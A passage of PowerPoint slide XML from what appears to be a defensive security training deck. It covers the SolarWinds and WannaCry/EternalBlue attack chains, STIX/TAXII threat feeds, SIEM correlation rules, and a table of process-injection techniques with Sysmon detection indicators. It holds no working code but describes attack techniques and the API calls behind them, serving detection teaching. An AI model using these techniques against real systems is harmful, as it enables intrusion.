                </a:solidFill>
              </a:rPr>
              <a:t> using subdomain-encoded victim identifiers, blending in with legitimate Orion network traffic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lateral Movement:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> On high-value targets, attackers deployed a second-stage implant (TEARDROP/Raindrop) and moved laterally to Microsoft 365 cloud environments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Discovery (Dec 2020):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> FireEye discovered the compromise while investigating an anomalous MFA device registration on a privileged account, a host-based IOC, not a network IOC.</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(2017)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WannaCry</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (May 2017) was a self-propagating ransomware worm that exploited the NSA-developed </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EternalBlue</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (CVE-2017-0144) SMBv1 vulnerability to infect over 230,000 systems in 150 countries within 72 hours.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(2017) (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_wannacry_propagation.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WannaCry propagation model: EternalBlue exploitation plus DoublePulsar backdoor installation created autonomous self-replication requiring no human interaction after initial infection.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(2017) (3/3)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Attack Chain</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Exploit:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> EternalBlue (CVE-2017-0144) exploits an SMBv1 buffer overflow to gain SYSTEM-level remote code execution.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Backdoor Install:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> DoublePulsar kernel-mode backdoor implanted via SMB.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Propagation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> WannaCry scans for other SMBv1 hosts on TCP 445 and self-replicates.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Payload:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> AES-encrypted file extension change (.WNCRY) and ransom note delivery.</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Detection Opportunities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Network:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Mass outbound SMB connections from a single host (lateral movement indicator).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Host:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Sysmon Event ID 3 (network connection) to TCP 445 from a non-admin process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Host:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Rapid file creation events for .WNCRY files (Sysmon Event ID 11).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Patch:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> MS17-010 (released March 2017) patches EternalBlue, unpatched systems two months later were fully exposed.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STIX, TAXII &amp; Threat Feeds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Structured Threat Information eXpression (STIX)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Trusted Automated eXchange of Intelligence Information (TAXII)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> are OASIS standards for representing and distributing threat intelligence, enabling automated IOC ingestion into security platforms.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STIX, TAXII &amp; Threat Feeds (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_stix_taxii_architecture.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STIX/TAXII intelligence sharing architecture: structured threat data flows from producers through a TAXII server into consumer security platforms for automated detection.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STIX, TAXII &amp; Threat Feeds (3/3)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STIX 2.1 Object Types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Indicator:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Pattern matching rule (e.g., file hash or IP address with context).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Malware:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Description of a malware family and its capabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Attack Pattern:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ATT&amp;CK technique reference with procedural details.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Threat Actor:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Attribution data linking indicators to known groups.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Relationship:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Links between STIX objects (e.g., "Threat Actor uses Malware").</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Threat Feed Sources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CISA AIS:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Automated Indicator Sharing, free US government threat feed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MISP:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Malware Information Sharing Platform, open-source, community-driven.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>VirusTotal Enterprise:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Commercial hash and domain reputation service.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AlienVault OTX:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Open Threat Exchange, community-contributed indicators.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ISACs:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Industry-specific sharing groups (FS-ISAC, H-ISAC, E-ISAC).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SIEM Architecture &amp; Correlation Rules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Security Information and Event Management (SIEM)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> system centralizes log collection from across the enterprise, enriches events with contextual data, and applies correlation rules to identify patterns that indicate active attacks.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SIEM Architecture &amp; Correlation Rules (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_siem_architecture.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SIEM architecture: raw logs from disparate sources are normalized, enriched with threat intelligence context, and correlated against detection rules to produce actionable security alerts.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SIEM Architecture &amp; Correlation Rules (3/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="20116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Collection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Agents and syslog forwarders send raw events from endpoints, firewalls, Active Directory, and cloud services to the SIEM ingestion layer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Parsing &amp; Normalization:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The SIEM parses vendor-specific log formats into a common schema (e.g., the Elastic Common Schema or the OCSF standard).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Enrichment:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Events are enriched with geolocation, asset inventory data, and threat intelligence feed lookups to add context.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Correlation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Detection rules match patterns across multiple events, for example, a failed logon (4625) followed by a successful logon (4624) from the same source IP within sixty seconds, flagging a brute-force success.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Alerting:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Correlated matches generate SIEM alerts with severity scores, forwarded to the SOC analyst triage queue.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Investigation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Analysts use the SIEM's search interface to pivot from the alert into the raw event timeline to validate and scope the incident.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Process Injection Techniques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Process injection</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (MITRE ATT&amp;CK T1055) allows attackers to execute malicious code within the address space of a legitimate process, evading detection by hiding behind the trusted process's reputation and privileges.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Process Injection Techniques (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_process_injection_techniques.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3575626"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="494562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Process injection taxonomy: four distinct techniques for executing attacker code inside a legitimate process, each with different API call signatures and detection approaches.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Process Injection Techniques (3/3)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Mechanism</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Detection Indicator</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ATT&amp;CK Sub-Technique</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>DLL Injection</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>WriteProcessMemory + CreateRemoteThread</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Sysmon ID 8 (CreateRemoteThread); unsigned DLL loaded by process</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1055.001</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Reflective DLL Injection</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Self-loading DLL resolves own imports</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>malfind: MZ header in non-mapped memory region</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1055.001</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Process Hollowing</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Legitimate process created suspended; image replaced</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Sysmon ID 1: process path does not match image hash</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1055.012</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>APC Queue Injection</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Malicious code queued as Asynchronous Procedure Call</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
